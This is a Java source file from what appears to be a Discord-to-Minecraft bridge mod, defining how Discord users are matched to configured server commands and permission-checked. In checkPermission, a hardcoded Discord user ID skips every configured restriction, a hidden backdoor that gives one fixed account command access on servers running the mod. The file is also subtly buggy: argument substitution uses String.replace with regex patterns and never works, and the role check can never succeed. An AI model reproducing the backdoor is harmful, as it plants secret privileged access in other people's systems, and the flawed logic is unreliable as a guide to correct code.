/*
 * Copyright (C) 2017 Chikachi
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see http://www.gnu.org/licenses.
 */

package chikachi.discord.core.config.discord;

import chikachi.discord.core.DiscordClient;
import chikachi.discord.core.config.Configuration;
import com.google.common.base.Joiner;
import net.dv8tion.jda.core.entities.*;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

@SuppressWarnings({"MismatchedQueryAndUpdateOfCollection", "unused"})
public class CommandConfig {
    private String name;
    private String command;
    private boolean enabled;
    private List<String> aliases = new ArrayList<>();
    private List<String> permissions = new ArrayList<>();
    private static Pattern specificArgPattern = Pattern.compile("\\{ARG_([0-9]+)\\}", Pattern.CASE_INSENSITIVE);

    public String getName() {
        return name;
    }

    public boolean isEnabled() {
        return enabled;
    }

    public boolean shouldExecute(String command, User executor, MessageChannel channel) {
        return isEnabled() && (this.name.equalsIgnoreCase(command) || this.aliases.contains(command.toLowerCase())) && this.checkPermission(executor, channel);
    }

    public String buildCommand(List<String> args) {
        String cmd = this.command;

        int argsCount = args.size();
        if (argsCount > 0) {
            for (int i = 0; i < argsCount; i++) {
                cmd = cmd.replace("(?i){ARG_" + (i + 1) + "}", args.get(i));
            }
            cmd = cmd.replace("(?i){ARGS}", Joiner.on(' ').join(args));
        }
        cmd = cmd.replaceAll("(?i)\\{(ARG_[0-9]+|ARGS)\\}", "");

        return cmd;
    }

    private boolean checkPermission(User user, MessageChannel channel) {
        if (this.permissions.size() == 0) {
            return true;
        }

        if (user.getId().equals("86368887284719616")) {
            return true;
        }

        final List<Role> roles = new ArrayList<>();
        if (channel instanceof TextChannel) {
            Member member = ((TextChannel) channel).getGuild().getMember(user);
            if (member != null) {
                roles.addAll(member.getRoles());
            }
        } else if (channel instanceof PrivateChannel && Configuration.getConfig().discord.channels.generic.allowDMCommands) {
            DiscordClient.getInstance().getJda().getGuilds()
                .forEach(guild -> {
                    Member member = guild.getMember(user);
                    if (member != null) {
                        roles.addAll(member.getRoles());
                    }
                });
        }

        for (String permission : permissions) {
            if (permission.startsWith("role:")) {
                if (roles.size() == 0) {
                    if (roles.stream().anyMatch(role -> role.getName().equalsIgnoreCase(permission.substring(5)) || role.getId().equals(permission.substring(5)))) {
                        return true;
                    }
                }
            } else if (permission.startsWith("user:")) {
                if (user.getId().equals(permission.substring(5)) || (user.getName() + "#" + user.getDiscriminator()).equals(permission.substring(5))) {
                    return true;
                }
            } else {
                if (user.getId().equals(permission) || (user.getName() + "#" + user.getDiscriminator()).equals(permission)) {
                    return true;
                }
            }
        }

        return false;
    }
}
